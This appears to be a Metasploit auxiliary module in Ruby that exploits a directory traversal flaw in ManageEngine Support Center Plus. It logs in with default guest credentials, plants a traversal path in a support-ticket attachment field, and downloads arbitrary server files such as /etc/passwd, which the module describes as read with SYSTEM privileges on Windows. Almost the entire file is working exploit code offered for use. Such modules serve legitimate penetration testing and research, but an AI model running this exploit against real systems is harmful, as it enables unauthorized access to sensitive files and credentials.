##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => "ManageEngine Support Center Plus Directory Traversal",
      'Description'    => %q{
        This module exploits a directory traversal vulnerability found in ManageEngine
        Support Center Plus build 7916 and lower. The module will create a support ticket
        as a normal user, attaching a link to a file on the server. By requesting our
        own attachment, it's possible to retrieve any file on the filesystem with the same
        privileges as Support Center Plus is running. On Windows this is always with SYSTEM
        privileges.
      },
      'License'        => MSF_LICENSE,
      'Author'         => 'xistence <xistence[at]0x90.nl>', # Discovery, Metasploit module
      'References'     =>
        [
          ['EDB', '31262'],
          ['OSVDB', '102656'],
          ['BID', '65199'],
          ['URL', 'http://packetstormsecurity.com/files/124975/ManageEngine-Support-Center-Plus-7916-Directory-Traversal.html']
        ],
      'DisclosureDate' => "Jan 28 2014"
    ))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('TARGETURI', [true, 'The base path to the Support Center Plus installation', '/']),
        OptString.new('USER', [true, 'The Support Center Plus user', 'guest']),
        OptString.new('PASS', [true, 'The Support Center Plus password', 'guest']),
        OptString.new('FILE', [true, 'The Support Center Plus password', '/etc/passwd'])
      ], self.class)
  end

  def run_host(ip)
    uri = target_uri.path
    peer = "#{ip}:#{rport}"

    vprint_status("#{peer} - Retrieving cookie")
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(uri, "")
    })

    if res and res.code == 200
      session = res.get_cookies
    else
      vprint_error("#{peer} - Server returned #{res.code.to_s}")
    end

    vprint_status("#{peer} - Logging in as user [ #{datastore['USER']} ]")
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri(uri, "j_security_check"),
      'cookie' => session,
      'vars_post' =>
      {
        'j_username' => datastore['USER'],
        'j_password' => datastore['PASS'],
        'logonDomainName' => 'undefined',
        'sso_status' => 'false',
        'loginButton' => 'Login'
      }
    })

    if res and res.code == 302
      vprint_status("#{peer} - Login succesful")
    else
      vprint_error("#{peer} - Login was not succesful!")
      return
    end

    randomname = Rex::Text.rand_text_alphanumeric(10)
    vprint_status("#{peer} - Creating ticket with our requested file [ #{datastore['FILE']} ] as attachment")
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri(uri, "WorkOrder.do"),
      'cookie' => session,
      'vars_post' =>
        {
          'reqTemplate' => '',
          'prodId' => '0',
          'priority' => '2',
          'reqID' => '2',
          'usertypename' => 'Requester',
          'reqName' => 'Guest',
          'category' => '0',
          'item' => '0',
          'subCategory' => '0',
          'title' => randomname,
          'description' => randomname,
          'MOD_IND' => 'WorkOrder',
          'FORMNAME' => 'WorkOrderForm',
          'attach' => "/../../../../../../../../../../../..#{datastore['FILE']}",
          'attPath' => '',
          'component' => 'Request',
          'attSize' => Rex::Text.rand_text_numeric(8),
          'attachments' => randomname,
          'autoCCList' => '',
          'addWO' => 'addWO'
        }
      })

    if res and res.code == 200
      vprint_status("#{peer} - Ticket created")
      if (res.body =~ /FileDownload.jsp\?module=Request\&ID=(\d+)\&authKey=(.*)\" class=/)
        fileid = $1
        vprint_status("#{peer} - File ID is [ #{fileid} ]")
        fileauthkey = $2
        vprint_status("#{peer} - Auth Key is [ #{fileauthkey} ]")
      else
        vprint_error("#{peer} - File ID and AuthKey not found!")
      end
    else
      vprint_error("#{peer} - Ticket not created due to error!")
      return
    end

    vprint_status("#{peer} - Requesting file [ #{uri}workorder/FileDownload.jsp?module=Request&ID=#{fileid}&authKey=#{fileauthkey} ]")
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(uri, "workorder", "FileDownload.jsp"),
      'vars_get' =>
      {
        'module' => 'Request',
        'ID' => fileid,
        'authKey' => fileauthkey
      }
    })

    # If we don't get a 200 when we request our malicious payload, we suspect
    # we don't have a shell, either.  Print the status code for debugging purposes.
    if res and res.code == 200
      data = res.body
      p = store_loot(
        'manageengine.supportcenterplus',
        'application/octet-stream',
        ip,
        data,
        datastore['FILE']
      )
      print_good("#{peer} - [ #{datastore['FILE']} ] loot stored as [ #{p} ]")
    else
      vprint_error("#{peer} - Server returned #{res.code.to_s}")
    end
  end
end

